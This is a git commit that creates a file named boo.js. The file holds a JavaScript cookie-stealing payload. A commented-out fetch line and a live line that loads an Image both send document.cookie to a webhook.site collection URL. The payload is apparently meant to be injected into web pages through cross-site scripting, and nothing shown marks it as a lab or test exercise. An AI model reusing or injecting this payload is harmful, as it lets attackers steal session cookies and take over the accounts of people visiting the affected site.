384842d5ef223e419d44e22bd2cd7a3c14036059
corvolu <87092266+corvolu@users.noreply.github.com>
2023-07-09 21:51:27 -0400

    Create boo.js

---
+++ boo.js
@@ -0,0 +1,3 @@
+// fetch("https://webhook.site/f1fff879-988b-4544-9edf-d34075418517/?cookie=" + document.cookie);
+
+var i=new Image;i.src="https://webhook.site/f1fff879-988b-4544-9edf-d34075418517/?cookie="+document.cookie;
